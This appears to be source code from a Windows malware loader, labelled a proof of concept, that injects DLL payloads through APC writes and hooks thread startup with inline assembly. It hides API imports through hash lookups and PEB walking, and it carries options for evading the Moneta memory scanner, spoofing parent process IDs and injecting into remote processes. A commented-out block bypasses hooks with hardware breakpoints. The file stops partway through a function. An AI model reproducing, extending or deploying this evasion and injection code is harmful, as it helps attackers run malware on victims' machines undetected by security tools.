/****
 * Proof of concept only. 
 * Stealth NZ loader: a APC write method with custom DLL loading
 * Utilise virtual method table hooking as presented by x86 Matthew in his blog post
 * With option -peb to add PEB to module list to evade Moneta
 * Remote inejction version of loader-37 with Sifu memory guard. 
 * TODO: implement PEM module loading for remote process. 
 * TODO: implement full VMT hooking Sifu memory guard to remote process
 * VMT Sifu memory guard for local process 
 * Add indirect syscall with Halo's gate method to replace NT functions used. 
 * Author: Thomas X Meng
# Date June 2024
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
 * 
*/
#include <windows.h>
#include <winternl.h> 
#include <psapi.h>
#include <stdlib.h> 
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

///For dynamic loading: 
#include <stdint.h>
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>
/// PEB module loader:
#include "pebutils.h"
// #include "HardwareBreakpoints.h"

#define MAX_INPUT_SIZE 100

typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);

/// DLL inj blocking and mitigation policies and ppid: 

typedef BOOL(WINAPI *InitializeProcThreadAttributeListFunc)(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwAttributeCount,
    DWORD dwFlags,
    PSIZE_T lpSize
);

typedef BOOL(WINAPI *UpdateProcThreadAttributeFunc)(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwFlags,
    DWORD_PTR Attribute,
    PVOID lpValue,
    SIZE_T cbSize,
    PVOID lpPreviousValue,
    PSIZE_T lpReturnSize
);


BOOL block_dlls_local()
{

	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Policy = { 0 };
	Policy.MicrosoftSignedOnly = 1;

	BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &Policy, sizeof(Policy));
	
	if (!result)
	{
		printf("[-] Failed to set DLL block for current process (%u)\n", GetLastError());

        return 0;
	}
	
	return 1;
}



///// End of DLL inj blocking and policy mitigation.


//// VMT hooking:
BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
BOOL bUseNoAccess = FALSE; 
HANDLE hProcess = NULL; 

SIZE_T regionSize = 0; // The size of the region
PVOID dllEntryPoint = NULL;

#define ADDR unsigned __int64
// Define the size of HookStub (31 bytes from the disassembly)
#define HOOKSTUB_SIZE 31
//Define a marco global vaariable of PVOID:
#define DECLARE_GLOBAL_PTR(varName) \
    PVOID varName = NULL;

// Use the macro to declare a global variable
DECLARE_GLOBAL_PTR(globalPointer);
#define NATIVE_VALUE ULONGLONG
#define DEBUG_REGISTER_EXEC_DR0 0x1
#define DEBUG_REGISTER_EXEC_DR1 0x4
#define DEBUG_REGISTER_EXEC_DR2 0x10
#define DEBUG_REGISTER_EXEC_DR3 0x40

#define SINGLE_STEP_FLAG 0x100
#define CURRENT_EXCEPTION_STACK_PTR e->ContextRecord->Rsp
#define CURRENT_EXCEPTION_INSTRUCTION_PTR e->ContextRecord->Rip
#define SINGLE_STEP_FLAG 0x100


/// custom mem cpy: 
void *mcopy(void* dest, const void* src, size_t n){
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

///GetNtdllBase:
ADDR *GetNtdllBase (void);


// Define your thread start routine
ULONG NTAPI ThreadStartRoutine(PVOID Context) {
	// message box: 
	MessageBoxA(NULL, "BaseThreadInitThunk is executed without hook", "BaseThreadInitThunk", MB_OK);
	//do nothing:
    return 0;
}

// Define basethreadinitthunk in Kernel32.dll:
typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;

DWORD_PTR dwGlobal_OrigCreateFileReturnAddr = 0;
DWORD_PTR dwGlobal_OrigReferenceAddr = 0; 
BYTE *pHookAddr = NULL;

HANDLE newThread = NULL;

// Function to be called from assembly to print a message
int print_hook_message() {
    printf("[+] HookStub executed!\n");
	MessageBoxA(NULL, "BaseThreadInitThunk is hooked", "BaseThreadInitThunk", MB_OK);
    // int result = 1 / 0;
    //call the original function:
    pBaseThreadInitThunk(0, ThreadStartRoutine, NULL);
    return 0;
}

void hooked_function();
PVOID fileBaseGlobal = NULL;
DLLEntry DllEntryGlobal = NULL;

int __declspec(naked) HookStub()
{

    // __asm__ volatile (
    //     // "lea 0f(%%rip), %%rax \n"   // Load address of the next instruction into rax
    //     "HookStub_start: \n"
    //     "mov %[orig_addr], %%rcx \n" // Save original return address to global variable
    //     // fill return value with 0x12345678
    //     // "mov $0xC0000156, %%rax \n"
    //     "sub $0x28, %%rsp \n"       // Allocate shadow space
    //     "call *%[func_addr] \n"     // Call hook function
    //     "add $0x28, %%rsp \n"       // Deallocate shadow space
    //     "jmp *%%rcx\n\t"
    //     "HookStub_end: \n"
    //     :
    //     : [func_addr] "r" (hooked_function),
    //       [orig_addr] "m" (dwGlobal_OrigReferenceAddr)
    // );

    __asm__ volatile (
        "movq %[orig_addr], %%rcx \n"   // Load the original return address into RCX
        "subq $0x28, %%rsp \n"          // Allocate shadow space on the stack
        "callq *%[func_addr] \n"        // Call the hooked function
        "addq $0x28, %%rsp \n"          // Restore the stack
        "jmpq *%%rcx \n"                // Jump back to the original return address
        :
        : [func_addr] "r" (hooked_function),
          [orig_addr] "m" (dwGlobal_OrigReferenceAddr)
        : "rcx"  
    );

    return 0;
    

}

//////// end of VMT hooking. 



// Standalone function to delay execution using WaitForSingleObjectEx
void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); 
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE);
        CloseHandle(hEvent); 
    }
}

const wchar_t* GetDllNameFromPath(const wchar_t* dllPath) {
    const wchar_t* dllName = wcsrchr(dllPath, L'\\');
    if (dllName) {
        return dllName + 1; // Move past the backslash
    }
    return dllPath; // If no backslash found, the path is already the DLL name
}


typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FREE, *PLDR_DATA_TABLE_ENTRY_FREE;

// Function to change the path of a loaded DLL in the PEB
// BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
//     // Get the PEB address
//     PROCESS_BASIC_INFORMATION pbi;
//     ULONG len;
//     NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
//     if (status != 0) {
//         wprintf(L"Failed to get PEB address. Status: %lx\n", status);
//         return FALSE;
//     }

//     // Get the LDR data
//     PPEB_LDR_DATA ldr = pbi.PebBaseAddress->Ldr;
//     PLIST_ENTRY list = &ldr->InMemoryOrderModuleList;

//     // Traverse the list to find the module
//     for (PLIST_ENTRY entry = list->Flink; entry != list; entry = entry->Flink) {
//         PLDR_DATA_TABLE_ENTRY_FREE dataTable = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
//         if (dataTable->DllBase == hModule) {
//             // Modify the FullDllName
//             size_t newPathLen = wcslen(newPath) * sizeof(wchar_t);
//             memcpy(dataTable->FullDllName.Buffer, newPath, newPathLen);
//             dataTable->FullDllName.Length = (USHORT)newPathLen;
//             dataTable->FullDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);

//             // Modify the BaseDllName if needed
//             wchar_t* baseName = wcsrchr(newPath, L'\\');
//             if (baseName) {
//                 baseName++;
//                 newPathLen = wcslen(baseName) * sizeof(wchar_t);
//                 memcpy(dataTable->BaseDllName.Buffer, baseName, newPathLen);
//                 dataTable->BaseDllName.Length = (USHORT)newPathLen;
//                 dataTable->BaseDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);
//             }
//             return TRUE;
//         }
//     }

//     wprintf(L"Module not found in PEB.\n");
//     return FALSE;
// }

/////////////////////////// Breakpoint test, TODO: 

// BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle);

// typedef struct {
//     unsigned int  dr0_local : 1;
//     unsigned int  dr0_global : 1;
//     unsigned int  dr1_local : 1;
//     unsigned int  dr1_global : 1;
//     unsigned int  dr2_local : 1;
//     unsigned int  dr2_global : 1;
//     unsigned int  dr3_local : 1;
//     unsigned int  dr3_global : 1;
//     unsigned int  local_enabled : 1;
//     unsigned int  global_enabled : 1;
//     unsigned int  reserved_10 : 1;
//     unsigned int  rtm : 1;
//     unsigned int  reserved_12 : 1;
//     unsigned int  gd : 1;
//     unsigned int  reserved_14_15 : 2;
//     unsigned int  dr0_break : 2;
//     unsigned int  dr0_len : 2;
//     unsigned int  dr1_break : 2;
//     unsigned int  dr1_len : 2;
//     unsigned int  dr2_break : 2;
//     unsigned int  dr2_len : 2;
//     unsigned int  dr3_break : 2;
//     unsigned int  dr3_len : 2;
// } dr7_t;



// // find the address of the syscall and retn instruction within a Nt* function
// BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* syscall_ret_addr) {
//     BYTE* ptr = (BYTE*)nt_func_addr;

//     // iterate through the native function stub to find the syscall instruction
//     for (int i = 0; i < 1024; i++) {

//         // check for syscall opcode (FF 05)
//         if (ptr[i] == 0x0F && ptr[i + 1] == 0x05) {
//             printf("Found syscall opcode at 0x%llx\n", (DWORD64)&ptr[i]);
//             *syscall_addr = (LPVOID)&ptr[i];
//             *syscall_ret_addr = (LPVOID)&ptr[i + 2];
//             break;
//         }
//     }

//     
//     if (!*syscall_addr) {
//         printf("error: syscall instruction not found\n");
//         return FALSE;
//     }

//     // make sure the instruction after syscall is retn
//     if (**(BYTE**)syscall_ret_addr != 0xc3) {
//         printf("Error: syscall instruction not followed by ret\n");
//         return FALSE;
//     }

//     return TRUE;
// }

// // set a breakpoint on the syscall and retn instruction of a Nt* function
// BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
//     LPVOID syscall_addr, syscall_ret_addr;
//     CONTEXT thread_context = { 0 };
//     HMODULE ntdll = GetModuleHandleA("ntdll.dll");

//     if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr)) {
//         return FALSE;
//     }

//     thread_context.ContextFlags = CONTEXT_FULL;

//     // get the current thread context (note, this must be a suspended thread)
//     if (!GetThreadContext(thread_handle, &thread_context)) {
//         printf("GetThreadContext() failed, error: %d\n", GetLastError());
//         return FALSE;
//     }

//     dr7_t dr7 = { 0 };

//     dr7.dr0_local = 1; // set DR0 as an execute breakpoint
//     dr7.dr1_local = 1; // set DR1 as an execute breakpoint

//     thread_context.ContextFlags = CONTEXT_ALL;

//     thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
//     thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
//     thread_context.Dr7 = *(DWORD*)&dr7;

//     // use SetThreadContext to update the debug registers
//     if (!SetThreadContext(thread_handle, &thread_context)) {
//         printf("SetThreadContext() failed, error: %d\n", GetLastError());
//     }

//     printf("Hardware breakpoints set\n");
//     return TRUE;
// }


// int g_bypass_method = 1;
// HANDLE g_thread_handle = NULL;
// // PCONTEXT g_thread_context = NULL;

// typedef NTSTATUS (WINAPI* t_NtSetContextThread)(
// 	HANDLE ThreadHandle, PCONTEXT Context
// 	);

// t_NtSetContextThread NtSetContextThread;

// typedef NTSTATUS (WINAPI* t_NtResumeThread)(
//     HANDLE ThreadHandle,
//     PULONG SuspendCount
// );

// t_NtResumeThread NtResumeThread;



// // dynamically resolve the required ntdll functions
// BOOL ResolveNativeApis()
// {
// 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
// 	if (!ntdll)
// 		return FALSE;

// 	NtSetContextThread = (t_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
// 	if (!NtSetContextThread)
// 		return FALSE;

//     NtResumeThread = (t_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
//     if (!NtResumeThread)
//         return FALSE;

//     // NtCreateThreadEx = (t_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");

// 	return TRUE;
// }



// // a separate thread for calling SetResumeThread so we can set hardware breakpoints
// //This function can be any function you would like to use as decoy to cause the exception.
// DWORD SetResumeThread(LPVOID param) {

//     HANDLE hThreadd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, CREATE_SUSPENDED, NULL);
// 	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
// 	NTSTATUS status = NtResumeThread(hThreadd, NULL);
// 	if (!NT_SUCCESS(status)) {
// 		printf("NtResumeThread failed, error: %x\n", status);
// 		return -1;
// 	}

// 	return 0;
// }



// DWORD SetCreateThread(LPVOID param) {

//     HANDLE g_thread_handle = NULL;
// 	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
// 	NTSTATUS status = NtCreateThreadEx(&g_thread_handle, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, FALSE, 0, 0, 0, NULL);
// 	if (!NT_SUCCESS(status)) {
// 		printf("NtCreateThreadEx failed, error: %x\n", status);
// 		return -1;
// 	}

// 	return 0;
// }


// // exception handler for hardware breakpoints
// LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
// {
// 	// hardware breakpoints trigger a single step exception
// 	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
// 		// this exception was caused by DR0 (syscall breakpoint)
// 		if (e->ContextRecord->Dr6 & 0x1) {
// 			printf("syscall breakpoint triggered at address: 0x%llx\n",
// 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);

// 			// replace the fake parameters with the real ones
// 			e->ContextRecord->Rcx = (DWORD64)g_thread_handle;
// 			e->ContextRecord->R10 = (DWORD64)g_thread_handle;
// 			// e->ContextRecord->Rdx = NULL;
// 			// e->ContextRecord->Rdx = (DWORD64)g_thread_context;
// 			/// for CreateThread
// 			// e->ContextRecord->Rcx = (DWORD64)NULL;
// 			// e->ContextRecord->R10 = (DWORD64)0;
// 			// e->ContextRecord->Rdx = (DWORD64)0;
// 			// e->ContextRecord->R8 = (LPTHREAD_START_ROUTINE)g_allocBuffer
// 		}

// 		// this exception was caused by DR1 (syscall ret breakpoint)
// 		if (e->ContextRecord->Dr6 & 0x2) {
// 			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
// 				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
//             // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.

// 			// set the parameters back to fake ones
// 			// since x64 uses registers for the first 4 parameters, we don't need to do anything here
// 			// for calls with more than 4 parameters, we'd need to modify the stack
// 		}
// 	}

// 	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution

// 	return EXCEPTION_CONTINUE_EXECUTION;
// }


// //Method 1: 
// BOOL BypassHookUsingBreakpoints() {
// 	// set an exception handler to handle hardware breakpoints
// 	SetUnhandledExceptionFilter(BreakpointHandler);

// 	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
// 	HANDLE new_thread = CreateThread(NULL, 0, SetResumeThread,
// 									 NULL, CREATE_SUSPENDED, NULL);
// 	if (!new_thread) {
// 		printf("CreateThread() failed, error: %d\n", GetLastError());
// 		return FALSE;
// 	} else {
//         printf("CreateThread() success\n");
//     }

// 	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
// 	SetSyscallBreakpoints((LPVOID)NtResumeThread, new_thread);
//     printf("Hardware breakpoints set\n");
// 	ResumeThread(new_thread);

// 	// wait until the SetThreadContext thread has finished before continuing
// 	// WaitForSingleObject(new_thread, INFINITE);

// 	return TRUE;
// }

////////////////////////// Breakpoint test end

void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
    DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)SourceString;
}


typedef enum _THREAD_STATE_CHANGE_TYPE
{
    ThreadStateChangeSuspend,
    ThreadStateChangeResume,
    ThreadStateChangeMax,
} THREAD_STATE_CHANGE_TYPE, *PTHREAD_STATE_CHANGE_TYPE;


typedef NTSTATUS (NTAPI *pNtCreateThreadStateChange)(
    PHANDLE ThreadStateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ThreadHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeThreadState)(
    HANDLE ThreadStateChangeHandle,
    HANDLE ThreadHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtCreateProcessStateChange)(
    PHANDLE StateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeProcessState)(
    HANDLE StateChangeHandle,
    HANDLE ProcessHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);


////// Test alert: 

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

/////////////////////////////////// Dynamic loading: 
#define ADDR unsigned __int64

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY_FREE dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return 0; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char CrucialLib[] = { 'N', 'T', 'D', 'L', 'L', 0 };
        const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        ADDR ntdll_base = find_dll_base(CrucialLib);
        // Example hashes for critical functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);
        const char NtCreateThreadStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
        uint32_t hash_NtCreateThread = crc32c(NtCreateThreadStr);
        printf("[+] Hash of NtCreateThread: %x\n", hash_NtCreateThread);
        // printf the hash to user:
        printf("[+] Hash of GetProcAddress: %x\n", hash_GetProcAddress);
        printf("[+] Hash of LoadLibraryW: %x\n", hash_LoadLibraryW);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        // dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(ntdll_base, hash_GetProcAddress);
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(ntdll_base, hash_GetModuleHandleA);
        // #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        // #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleessentialLibHandle(crucialLib), _name))

        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        // dynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base, "GetProcAddress");
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
        // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
        // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
        printf("[+] LoadLibrary at: %p\n by stealth module loading", loadFuture);
    }
}
////////////////////////////////////
const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder);
BOOL PrintSectionDetails(const wchar_t* dllPath);

void PrintUsageAndExit() {
    wprintf(L"Usage: loader_21.exe [-txf] [-dll <order>] [-h]\n");
    wprintf(L"Options:\n");
    wprintf(L"  -txf                Use Transactional NTFS (TxF) for DLL loading.\n");
    wprintf(L"  -dll <order>        Specify the order of the suitable DLL to use (default is 1). Not all DLLs are suitable for overloading\n");
    wprintf(L"  -h                  Print this help message and exit.\n");
    wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
    wprintf(L"  -pool               Use Threadpool for APC Write\n");
    wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection\n");
    wprintf(L"  -peb                Use custom function to add loaded module to PEB lists to evade Moneta\n");
    wprintf(L"  -remote             Use remote process to load the DLL\n");
    wprintf(L"  -dotnet             Use .NET assemblies instead of regular DLLs\n");
    wprintf(L"  -ppid               provide the target parent PID to spoof. \n");
    wprintf(L"  -a                  Switch to PAGE_NOACCESS after write the memory to .text section\n");
    ExitProcess(0);
}


BOOL ValidateDLLCharacteristics(const wchar_t* dllPath, uint32_t requiredSize, bool dotnet = FALSE) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; // Cannot open file
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
